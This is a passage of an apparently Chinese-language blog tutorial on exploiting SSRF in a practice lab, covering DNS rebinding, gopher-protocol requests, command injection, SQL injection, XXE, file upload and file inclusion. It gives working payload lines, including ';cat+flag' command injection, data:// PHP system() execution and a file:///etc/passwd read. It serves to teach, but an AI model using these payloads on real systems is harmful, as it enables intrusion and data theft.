+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">设置一个合法<span class="hljs-built_in">IP</span>为A	设置<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>公网<span class="hljs-built_in">IP</span>为<span class="hljs-keyword">B</span><br>生成DNS解析<br><span class="hljs-symbol">df657038.7f000001.rbndr.us</span><br><br>访问<br><span class="hljs-symbol">http:</span><span class="hljs-comment">//df657038.7f000001.rbndr.us/flag.php</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="使用SSRF-GET提交命令执行"><a href="#使用SSRF-GET提交命令执行" class="headerlink" title="使用SSRF GET提交命令执行"></a>使用SSRF GET提交命令执行</h2><p>例如：</p>
+<p>使用shell.php页面GET方法传值进行命令执行</p>
+<p><img src="/../image/ssrf-26.png"></p>
+<hr>
+<p>使用gopher伪协议进行命令执行</p>
+<p><img src="/../image/ssrf-27.png"></p>
+<p>构造gopher伪协议命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先在输入框中输入<br>gopher://172.250.250.4:80/_<br><br>然后抓包构造header poc<br>GET /shell.php?cmd=<span class="hljs-built_in">id</span> HTTP/1.1<br>Host: 172.250.250.4<br><br>注意还有个换行符<br>然后进行两次url编码接在gopher伪协议之后<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/ssrf-28.png"></p>
+<h2 id="使用SSRF-POST提交命令执行"><a href="#使用SSRF-POST提交命令执行" class="headerlink" title="使用SSRF POST提交命令执行"></a>使用SSRF POST提交命令执行</h2><p>前期依旧是使用file伪协议和dict伪协议、http伪协议查找内网存活主机IP和内网主机开放端口并且扫描目录，查找可利用的页面</p>
+<p>使用gopher伪协议进行POST提交</p>
+<p><img src="/../image/ssrf-29.png"></p>
+<p><img src="/../image/ssrf-30.png"></p>
+<p>POST提交命令执行拿到flag，还是注意构造好header poc，长度要对应</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;cat+flag</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/ssrf-31.png"></p>
+<hr>
+<h2 id="使用SSRF进行XXE漏洞利用"><a href="#使用SSRF进行XXE漏洞利用" class="headerlink" title="使用SSRF进行XXE漏洞利用"></a>使用SSRF进行XXE漏洞利用</h2><p>XXE漏洞实例：</p>
+<p><img src="/../image/ssrf-32.png"></p>
+<p><img src="/../image/ssrf-33.png"></p>
+<p>构造payload：</p>
+<p><img src="/../image/ssrf-34.png"></p>
+<p>然后使用gopher伪协议进行提交<br><img src="/../image/ssrf-35.png"></p>
+<hr>
+<h2 id="使用SSRF进行sql注入漏洞"><a href="#使用SSRF进行sql注入漏洞" class="headerlink" title="使用SSRF进行sql注入漏洞"></a>使用SSRF进行sql注入漏洞</h2><p>1、使用http伪协议获取信息</p>
+<p>2、sql注入</p>
+<p>实例：</p>
+<p>路径</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>sql注入代码</p>
+<p><img src="/../image/ssrf-36.png"></p>
+<p>浏览器直接提交</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">http:<span class="hljs-comment">//172.250.250.11/Less-1/?id=1&#x27;--%20</span><br><br>注意：<br>这里--之后应该用<span class="hljs-meta">%</span><span class="hljs-number">20</span>而不是+，空格必须先url编码一次变成<span class="hljs-meta">%</span><span class="hljs-number">20</span><br>如果在hackbar中则需要进行两次url编码<br></code></pre></td></tr></table></figure>
+
+<h3 id="sql注入GET提交"><a href="#sql注入GET提交" class="headerlink" title="sql注入GET提交"></a><strong>sql注入GET提交</strong></h3><p><img src="/../image/ssrf-37.png"></p>
+<hr>
+<h3 id="sql注入POST提交"><a href="#sql注入POST提交" class="headerlink" title="sql注入POST提交"></a><strong>sql注入POST提交</strong></h3><p><img src="/../image/ssrf-38.png"></p>
+<p><img src="/../image/ssrf-39.png"></p>
+<p>构造payload并使用gopher伪协议提交<br><img src="/../image/ssrf-40.png"></p>
+<p>替换查找内容，以及字符串长度</p>
+<hr>
+<h2 id="使用SSRF进行文件上传漏洞"><a href="#使用SSRF进行文件上传漏洞" class="headerlink" title="使用SSRF进行文件上传漏洞"></a>使用SSRF进行文件上传漏洞</h2><h3 id="multipart-form-data的定义"><a href="#multipart-form-data的定义" class="headerlink" title="multipart&#x2F;form-data的定义"></a><strong>multipart&#x2F;form-data的定义</strong></h3><p><img src="/../image/ssrf-41.png"></p>
+<p>文件上传漏洞实例：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.14</span>/Pass-<span class="hljs-number">01</span>/index.php<br></code></pre></td></tr></table></figure>
+
+<p>先查看源码：</p>
+<p><img src="/../image/ssrf-42.png"></p>
+<p>请求头，需要指定边界</p>
+<p><img src="/../image/ssrf-43.png"></p>
+<h3 id="构造gohper提交数据"><a href="#构造gohper提交数据" class="headerlink" title="构造gohper提交数据"></a>构造gohper提交数据</h3><p><img src="/../image/ssrf-44.png"></p>
+<p>这里分隔符可以自定义。并且最后还需要结束符号</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">分隔符格式</span><br><span class="hljs-literal">--</span><span class="hljs-comment">分隔符</span><br><br><span class="hljs-comment">结束分隔符</span><br><span class="hljs-literal">--</span><span class="hljs-comment">自定义分隔符</span><span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="使用gopher伪协议提交"><a href="#使用gopher伪协议提交" class="headerlink" title="使用gopher伪协议提交"></a>使用gopher伪协议提交</h3><p><img src="/../image/ssrf-45.png"></p>
+<hr>
+<h2 id="使用SSRF进行文件包含漏洞利用"><a href="#使用SSRF进行文件包含漏洞利用" class="headerlink" title="使用SSRF进行文件包含漏洞利用"></a>使用SSRF进行文件包含漏洞利用</h2><p>例如</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">执行data://伪协议	命令执行	空格用%20代替</span><br><span class="language-xml"></span><br><span class="language-xml">http://172.250.250.14/include.php?file=file:///etc/passwd</span><br><span class="language-xml">执行file://伪协议	读取文件</span><br><span class="language-xml"></span><br><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">执行data://伪协议	代码执行	空格用%20代替</span><br></code></pre></td></tr></table></figure>
+
+<p>gopher伪协议ssrf和之前的几个漏洞差不多</p>
+<hr>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
